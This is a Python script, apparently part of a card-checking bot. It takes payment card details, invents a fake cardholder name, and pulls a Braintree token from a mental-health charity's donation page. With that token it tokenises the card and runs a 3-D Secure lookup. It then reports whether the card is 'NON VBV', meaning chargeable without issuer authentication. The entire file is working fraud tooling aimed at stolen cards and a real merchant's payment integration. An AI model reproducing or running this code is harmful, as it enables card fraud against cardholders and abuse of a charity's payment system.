import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os



session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
def check_vbv(input):
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  if x:
    card = x.group(0)

  ccn, mm, yy, cvv = card.split('|',4)
  if mm.startswith('2'):
      mm, yy = yy, mm
  if len(mm) >= 3:
      mm, yy, cvv = yy, cvv, mm
  if len(ccn) < 15 or len(ccn) > 16:
      return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 



  #x = re.findall(r'\d+', input)
  #print(x)
  #ccn = x[0]
  #print(ccn)
  #mm = x[1]
  #yy = x[2]
  #cvv = x[3]
  #if mm.startswith('2'):
            #mm, yy = yy, mm
  #if len(mm) >= 3:
    #        mm, yy, cvv = yy, cvv, mm
  #if len(ccn) < 15 or len(ccn) > 16:
    #        return ('<b>Failed to parse Card</b>\n'
  #                                     '<b>Reason: Invalid Format!</b>')   
  #BIN = ccn[:6]

  headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

  
  headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

  b = session.get('https://ip.seeip.org/').text
  time1 = time.time()
  s = session.post('https://m.stripe.com/6', headers=headers)
  r = s.json()
  Guid = r['guid']
  Muid = r['muid']
  Sid = r['sid']

  LastF = f'************{ccn[-4:]}'

  
  head = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

  r2 = session.get('https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken',
                          headers=head)
        
  clientToken1 = r2.json()['clientToken']  
  clientToken = base64.b64decode(clientToken1)
        
  content = json.loads(clientToken.decode('utf-8'))        
  bearer = content['authorizationFingerprint']
  time2 = time.time()     
        
        

  payload2 = { "clientSdkMetadata": {"source":"client", "integration":"dropin2","sessionId":Guid},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":ccn,"expirationMonth":mm,"expirationYear":yy,"cvv":cvv,"cardholderName":First+" botne"},"options":{"validate":"false"}}},"operationName":"TokenizeCreditCard"}
       
            
            
        
 
  head2 = {
            "user-agent": UA,   
            #"accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "authorization": "Bearer "+bearer,
            "braintree-Version": "2018-05-10",
            "host": "payments.braintree-api.com",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/"
            
        }
        
  r3 = requests.post('https://payments.braintree-api.com/graphql', json=payload2,
                          headers=head2)
        
  time3 = time.time()
  res = r3.json()
        
        
      
  token1 = res['data']['tokenizeCreditCard']['token']
  brand = res['data']['tokenizeCreditCard']['creditCard']['brandCode']
  bin = res['data']['tokenizeCreditCard']['creditCard']['bin']
  bindata =  res['data']['tokenizeCreditCard']['creditCard']['binData']
  bank = bindata['issuingBank']
  country = bindata['countryOfIssuance']



  payload3 = {"amount":"1",
         "additionalInfo":{"acsWindowSize":"03"},
         "bin":bin,
         "dfReferenceId":"1_f802e5f3-2dc6-4b6d-a28b-2d98b0ebcaf3",
         "clientMetadata":{"requestedThreeDSecureVersion":"2",
         "sdkVersion":"web/3.58.0",
         "cardinalDeviceDataCollectionTimeElapsed":842,
         "issuerDeviceDataCollectionTimeElapsed":602,
         "issuerDeviceDataCollectionResult":"true"},
         "authorizationFingerprint":bearer,
         "braintreeLibraryVersion":"braintree/web/3.58.0",
         "_meta":{"merchantAppId":"charliewaller.org",
         "platform":"web",
         "sdkVersion":"3.58.0",
         "source":"client",
         "integration":"custom",
         "integrationType":"custom",
         "sessionId":Guid}
                   }
        
        
  head3 = {
            "user-agent": UA,
            "accept": "*/*",
            #"content-type": "application/x-www-form-urlencoded",
            "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
            "host": "api.braintreegateway.com",
            "origin": "https://charliewaller.org",
            "referer": "https://charliewaller.org/"
        }
        
  r4 = session.post('https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/'+token1+'/three_d_secure/lookup', json=payload3,
                          headers=head3)
  time3 = time.time()
        
  threeDSecureInfo = r4.json()['paymentMethod']['threeDSecureInfo']
  status = threeDSecureInfo['status']

  if 'bypassed' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'authenticate_attempt_successful' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'authenticate_successful' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'lookup_not_enrolled' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'authentication_unavailable' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ✅NON VBV B3✅
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''') 
    
  if 'lookup_enrolled' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')
 
  if 'failed' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'error' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'authenticate_successful_issuer_not_participating' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'data_only_successful' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')
 
  if 'authenticate_unable_to_authenticate' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

  if 'unsupported' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')
 
  if 'challenge_required' in r4.text:
            return (f'''
<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ❌VBV❌
<b>MSG</b>➟ {status}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')